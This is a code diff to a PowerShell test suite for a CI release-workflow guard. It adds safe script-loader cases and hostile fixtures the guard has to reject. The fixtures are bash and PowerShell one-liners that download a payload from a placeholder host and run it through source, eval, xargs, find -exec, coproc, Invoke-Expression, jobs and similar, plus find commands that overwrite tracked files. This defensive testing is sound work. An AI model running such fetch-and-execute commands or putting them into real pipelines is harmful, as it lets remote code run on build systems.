@@ -987,6 +987,7 @@ fi
 
     $safeTimeoutCases = @(
         @{ Name = 'timeout end-of-options preserves a tracked PowerShell script'; Text = 'timeout -- 1 pwsh -File ./scripts/validate-release-artifact-set.ps1'; Shell = 'bash' },
+        @{ Name = 'PowerShell executable suffix preserves a tracked script'; Text = 'pwsh.exe -File ./scripts/validate-release-artifact-set.ps1'; Shell = 'bash' },
         @{ Name = 'timeout option values preserve a tracked Bash script'; Text = 'timeout -k 1 -- 2 bash ./scripts/validate-release-artifact-set.ps1'; Shell = 'bash' },
         @{ Name = 'timeout end-of-options preserves ordinary runner-temp output'; Text = ('timeout -- 1 printf payload > "' + $workflowRunnerTemp + '/timeout-output.txt"'); Shell = 'bash' },
         @{ Name = 'GNU gtimeout preserves a tracked PowerShell script'; Text = '/opt/homebrew/bin/gtimeout -k 1 -- 2 pwsh -File ./scripts/validate-release-artifact-set.ps1'; Shell = 'bash' },
@@ -995,6 +996,18 @@ fi
     foreach ($case in $safeTimeoutCases) {
         $fixture = New-WorkflowGitScriptConsumerFixture -ScriptPath $script -RunsAfterDownload @(@{ Name = $case.Name; Text = $case.Text; Shell = $case.Shell })
         $result = @(Invoke-ReleaseWorkflowScriptSourceGuard -Workflows @(@{ Name = 'safe-timeout-wrapper.yml'; Text = $fixture }) -RepositoryRoot $RepositoryRoot -RequiredConsumerNames @('safe-timeout-wrapper.yml/future-consumer'))
+        if ($result.Count -ne 1 -or $result[0].Scripts -notcontains $script) { throw "Workflow contract rejected $($case.Name)." }
+    }
+
+    $safeScriptLoaderCases = @(
+        @{ Name = 'Bash dot-source preserves a tracked script'; Text = '. ./scripts/validate-release-artifact-set.ps1'; Shell = 'bash' },
+        @{ Name = 'Bash source preserves a tracked script'; Text = 'source ./scripts/validate-release-artifact-set.ps1'; Shell = 'bash' },
+        @{ Name = 'PowerShell dot-source preserves a tracked script'; Text = '. .\scripts\validate-release-artifact-set.ps1'; Shell = 'pwsh' },
+        @{ Name = 'PowerShell invocation preserves a tracked script'; Text = ('Write-Output start' + [Environment]::NewLine + '& .\scripts\validate-release-artifact-set.ps1'); Shell = 'pwsh' }
+    )
+    foreach ($case in $safeScriptLoaderCases) {
+        $fixture = New-WorkflowGitScriptConsumerFixture -ScriptPath $script -RunsAfterDownload @(@{ Name = $case.Name; Text = $case.Text; Shell = $case.Shell })
+        $result = @(Invoke-ReleaseWorkflowScriptSourceGuard -Workflows @(@{ Name = 'safe-script-loader.yml'; Text = $fixture }) -RepositoryRoot $RepositoryRoot -RequiredConsumerNames @('safe-script-loader.yml/future-consumer'))
         if ($result.Count -ne 1 -or $result[0].Scripts -notcontains $script) { throw "Workflow contract rejected $($case.Name)." }
     }
 
@@ -1262,8 +1275,26 @@ fi
     $hiddenRunnerTempLoaders = @(
         @{ Name = 'Bash dot-source helper can create a tracked-path link'; Text = ('curl --output "' + $workflowRunnerTemp + '/prepare.sh" https://host/payload; . "' + $workflowRunnerTemp + '/prepare.sh"'); Shell = 'bash' },
         @{ Name = 'Bash source helper can create a tracked-path link'; Text = ('curl --output "' + $workflowRunnerTemp + '/prepare.sh" https://host/payload; source "' + $workflowRunnerTemp + '/prepare.sh"'); Shell = 'bash' },
+        @{ Name = 'Assignment-prefixed Bash dot-source helper can create a tracked-path link'; Text = ('curl --output "' + $workflowRunnerTemp + '/prepare.sh" https://host/payload; PREPARE=ready . "' + $workflowRunnerTemp + '/prepare.sh"'); Shell = 'bash' },
+        @{ Name = 'Assignment-prefixed Bash source helper can create a tracked-path link'; Text = ('curl --output "' + $workflowRunnerTemp + '/prepare.sh" https://host/payload; PREPARE=ready source "' + $workflowRunnerTemp + '/prepare.sh"'); Shell = 'bash' },
+        @{ Name = 'Builtin-wrapped Bash dot-source helper can create a tracked-path link'; Text = ('curl --output "' + $workflowRunnerTemp + '/prepare.sh" https://host/payload; builtin . "' + $workflowRunnerTemp + '/prepare.sh"'); Shell = 'bash' },
+        @{ Name = 'Command-wrapped Bash source helper can create a tracked-path link'; Text = ('curl --output "' + $workflowRunnerTemp + '/prepare.sh" https://host/payload; command source "' + $workflowRunnerTemp + '/prepare.sh"'); Shell = 'bash' },
+        @{ Name = 'xargs launches an external Bash helper'; Text = ('curl --output "' + $workflowRunnerTemp + '/prepare.sh" https://host/payload; printf trigger | xargs bash "' + $workflowRunnerTemp + '/prepare.sh"'); Shell = 'bash' },
+        @{ Name = 'find exec launches an external Bash helper'; Text = ('curl --output "' + $workflowRunnerTemp + '/prepare.sh" https://host/payload; find . -exec bash "' + $workflowRunnerTemp + '/prepare.sh" \;'); Shell = 'bash' },
+        @{ Name = 'find ok launches an external Bash helper'; Text = ('curl --output "' + $workflowRunnerTemp + '/prepare.sh" https://host/payload; find . -ok bash "' + $workflowRunnerTemp + '/prepare.sh" \;'); Shell = 'bash' },
+        @{ Name = 'BusyBox xargs launches an external Bash helper'; Text = ('curl --output "' + $workflowRunnerTemp + '/prepare.sh" https://host/payload; printf trigger | busybox xargs bash "' + $workflowRunnerTemp + '/prepare.sh"'); Shell = 'bash' },
+        @{ Name = 'BusyBox shell loads an external Bash helper'; Text = ('curl --output "' + $workflowRunnerTemp + '/prepare.sh" https://host/payload; busybox sh "' + $workflowRunnerTemp + '/prepare.sh"'); Shell = 'bash' },
+        @{ Name = 'Bash coprocess loads an external helper'; Text = ('curl --output "' + $workflowRunnerTemp + '/prepare.sh" https://host/payload; coproc bash "' + $workflowRunnerTemp + '/prepare.sh"'); Shell = 'bash' },
+        @{ Name = 'Assignment-prefixed eval loads a runner-temp helper'; Text = ('curl --output "' + $workflowRunnerTemp + '/prepare.sh" https://host/payload; PREPARE=ready eval "bash ' + $workflowRunnerTemp + '/prepare.sh"'); Shell = 'bash' },
+        @{ Name = 'parallel launches an external Bash helper'; Text = ('curl --output "' + $workflowRunnerTemp + '/prepare.sh" https://host/payload; parallel bash "' + $workflowRunnerTemp + '/prepare.sh" ::: trigger'); Shell = 'bash' },
         @{ Name = 'PowerShell dot-source helper can create a tracked-path link'; Text = ('Invoke-WebRequest -Uri https://host/payload -OutFile "' + $workflowRunnerTemp + '\prepare.ps1"; . ' + $workflowRunnerTemp + '\prepare.ps1'); Shell = 'pwsh' },
         @{ Name = 'PowerShell -File helper can create a tracked-path link'; Text = ('Invoke-WebRequest -Uri https://host/payload -OutFile "' + $workflowRunnerTemp + '\prepare.ps1"; pwsh -File "' + $workflowRunnerTemp + '\prepare.ps1"'); Shell = 'pwsh' },
+        @{ Name = 'PowerShell executable suffix -File helper can create a tracked-path link'; Text = ('Invoke-WebRequest -Uri https://host/payload -OutFile "' + $workflowRunnerTemp + '\prepare.ps1"; pwsh.exe -File "' + $workflowRunnerTemp + '\prepare.ps1"'); Shell = 'pwsh' },
+        @{ Name = 'PowerShell abbreviated -File helper can create a tracked-path link'; Text = ('Invoke-WebRequest -Uri https://host/payload -OutFile "' + $workflowRunnerTemp + '\prepare.ps1"; pwsh -f "' + $workflowRunnerTemp + '\prepare.ps1"'); Shell = 'pwsh' },
+        @{ Name = 'PowerShell attached -File helper path can create a tracked-path link'; Text = ('Invoke-WebRequest -Uri https://host/payload -OutFile "' + $workflowRunnerTemp + '\prepare.ps1"; pwsh -File="' + $workflowRunnerTemp + '\prepare.ps1"'); Shell = 'pwsh' },
+        @{ Name = 'PowerShell Invoke-Expression loads a runner-temp helper'; Text = ('Invoke-WebRequest -Uri https://host/payload -OutFile "' + $workflowRunnerTemp + '\prepare.ps1"; Invoke-Expression "& ' + $workflowRunnerTemp + '\prepare.ps1"'); Shell = 'pwsh' },
+        @{ Name = 'PowerShell job loads a runner-temp helper'; Text = ('Invoke-WebRequest -Uri https://host/payload -OutFile "' + $workflowRunnerTemp + '\prepare.ps1"; Start-Job -ScriptBlock { . ' + $workflowRunnerTemp + '\prepare.ps1 }'); Shell = 'pwsh' },
+        @{ Name = 'PowerShell parallel scriptblock loads a runner-temp helper'; Text = ('Invoke-WebRequest -Uri https://host/payload -OutFile "' + $workflowRunnerTemp + '\prepare.ps1"; 1 | ForEach-Object -Parallel { . ' + $workflowRunnerTemp + '\prepare.ps1 }'); Shell = 'pwsh' },
         @{ Name = 'Unquoted PowerShell executable helper invocation can create a tracked-path link'; Text = ('Invoke-WebRequest -Uri https://host/payload -OutFile "' + $workflowRunnerTemp + '\prepare.ps1"; pwsh $env:RUNNER_TEMP\prepare.ps1'); Shell = 'pwsh' },
         @{ Name = 'Unquoted PowerShell command helper invocation can create a tracked-path link'; Text = ('Invoke-WebRequest -Uri https://host/payload -OutFile "' + $workflowRunnerTemp + '\prepare.ps1"; $env:RUNNER_TEMP\prepare.ps1'); Shell = 'pwsh' }
     )
@@ -1274,12 +1305,25 @@ fi
     foreach ($loader in $hiddenRunnerTempLoaders) {
         foreach ($target in $hiddenLinkTargets) {
             foreach ($position in @('before artifact download', 'after artifact download', 'between guarded invocations')) {
-                $fixture = New-WorkflowRunnerTempRedirectFixture -ScriptPath $script -LinkText $loader.Text -WriteText $target.Write -Shell $loader.Shell -Position $position
+                $fixture = New-WorkflowRunnerTempRedirectFixture -ScriptPath $script -LinkText $loader.Text -WriteText $target.Write -Shell $loader.Shell -Position $position -IncludeShellCheckout
                 $rejected = $false
                 try { $null = Invoke-ReleaseWorkflowScriptSourceGuard -Workflows @(@{ Name = 'hidden-runner-temp-link.yml'; Text = $fixture }) -RepositoryRoot $RepositoryRoot }
                 catch { $rejected = $true }
                 if (-not $rejected) { throw "Workflow contract accepted $($loader.Name) targeting a $($target.Name) $position, despite a later pinned checkout." }
             }
+        }
+    }
+    $findTrackedWriterCases = @(
+        @{ Name = 'find -fprint overwrites tracked root'; Text = 'find . -fprint CHANGELOG.md' },
+        @{ Name = 'find -fls overwrites nested tracked path'; Text = 'find . -fls src/KeelMatrix.PackageSurface.Cli/README.md' }
+    )
+    foreach ($writer in $findTrackedWriterCases) {
+        foreach ($position in @('before artifact download', 'after artifact download', 'between guarded invocations')) {
+            $fixture = New-WorkflowRunnerTempRedirectFixture -ScriptPath $script -LinkText 'printf payload' -WriteText $writer.Text -Shell 'bash' -Position $position -IncludeShellCheckout
+            $rejected = $false
+            try { $null = Invoke-ReleaseWorkflowScriptSourceGuard -Workflows @(@{ Name = 'find-tracked-output.yml'; Text = $fixture }) -RepositoryRoot $RepositoryRoot }
+            catch { $rejected = $true }
+            if (-not $rejected) { throw "Workflow contract accepted $($writer.Name) after the checkout and download sequence at $position." }
         }
     }
 
